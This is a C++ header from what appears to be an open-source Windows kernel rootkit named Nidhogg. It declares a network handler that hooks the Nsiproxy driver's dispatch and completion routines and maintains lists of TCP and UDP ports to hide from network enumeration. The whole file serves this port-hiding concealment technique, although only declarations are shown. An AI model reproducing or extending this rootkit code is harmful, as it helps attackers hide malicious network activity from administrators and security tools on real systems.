#pragma once
#include "pch.h"
#include "IoctlShared.h"
#include "MemoryHelper.h"

extern "C" {
	#include "WindowsTypes.h"
	#include "NidhoggCommon.h"
}
#include "ListHelper.hpp"

constexpr USHORT MAX_PORT_NUMBER = 65535;
constexpr ULONG IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS = 0x12001B;
constexpr WCHAR NSI_DRIVER_NAME[] = L"\\Driver\\Nsiproxy";
constexpr USHORT htohs(USHORT port) { return (((port >> 8) & 0x00FF) | ((port << 8) & 0xFF00)); }

struct HiddenPort {
	LIST_ENTRY Entry;
	bool Remote;
	PortType Type;
	USHORT Port;
};

struct HiddenPorts {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
};

struct HookedCompletionRoutine {
	PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
	PVOID OriginalContext;
};

_IRQL_requires_max_(APC_LEVEL)
NTSTATUS HidePort(_Inout_ PVOID entries, _In_ PNSI_PARAM nsiParameter, _Inout_ PNSI_STATUS_ENTRY statusEntries,
	_Inout_ PNSI_PROCESS_ENTRY processEntries, _In_ SIZE_T index);

_IRQL_requires_max_(APC_LEVEL)
_IRQL_requires_same_
NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _Inout_ PVOID irpContext);

_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS HookedNsiDispatch(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp);

class NetworkHandler {
private:
	bool callbackActivated;
	HiddenPorts hiddenTcpPorts;
	HiddenPorts hiddenUdpPorts;
	PVOID originalNsiDispatchAddress;

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InstallNsiHook(_In_ bool remove = false);

public:
	void* operator new(size_t size) {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(APC_LEVEL)
	NetworkHandler();

	_IRQL_requires_max_(APC_LEVEL)
	~NetworkHandler();

	_IRQL_requires_max_(APC_LEVEL)
	bool FindHiddenPort(_In_ HiddenPort& port) const;

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenPort(_In_ HiddenPort& port);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveHiddenPort(_In_ HiddenPort& port);

	_IRQL_requires_max_(APC_LEVEL)
	void ClearHiddenPortsList(_In_ PortType portType);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListHiddenPorts(_Inout_ IoctlHiddenPorts* hiddenPorts) const;

	PVOID GetOriginalCallback() const { return this->originalNsiDispatchAddress; }
};

inline NetworkHandler* NidhoggNetworkHandler;

